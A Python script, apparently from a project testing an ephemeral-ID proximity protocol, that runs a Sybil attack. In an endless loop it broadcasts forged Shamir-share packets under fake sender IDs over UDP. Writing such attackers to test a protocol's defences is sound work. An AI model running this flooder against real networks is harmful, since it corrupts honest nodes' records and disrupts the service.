from __future__ import annotations

import socket
import time
import json

from src.crypto_utils import generate_ephid_keypair
from src.shamir_utils import split_secret, serialize_share


TARGET_IP = "255.255.255.255"
TARGET_PORT = 37020

K = 3
N = 5


def build_fake_packets(fake_sender_id: str, epoch_id: int) -> list[dict]:
    ephid = generate_ephid_keypair()
    shares = split_secret(ephid.public_key_bytes, k=K, n=N)

    packets = []
    for share in shares[:K]:
        packets.append(
            {
                "type": "share",
                "version": 1,
                "sender_id": fake_sender_id,
                "epoch_id": epoch_id,
                "ephid_hash": ephid.ephid_hash,
                "k": K,
                "n": N,
                "share": serialize_share(share),
                "timestamp": time.time(),
            }
        )
    return packets


def main() -> None:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

    print("[attacker] sybil attacker started")

    round_id = 0
    while True:
        epoch_id = int(time.time() // 15)

        for i in range(3):
            fake_id = f"attacker-{round_id}-{i}"
            packets = build_fake_packets(fake_id, epoch_id)

            print(f"[attacker] broadcasting fake node {fake_id}")

            for packet in packets:
                payload = json.dumps(
                    packet, separators=(",", ":"), sort_keys=True
                ).encode("utf-8")
                sock.sendto(payload, (TARGET_IP, TARGET_PORT))
                print(
                    f"[attacker] sent fake share sender={fake_id} "
                    f"share={packet['share'].split('-', 1)[0]}/{N}"
                )
                time.sleep(0.05)

        round_id += 1
        time.sleep(3)


if __name__ == "__main__":
    main()

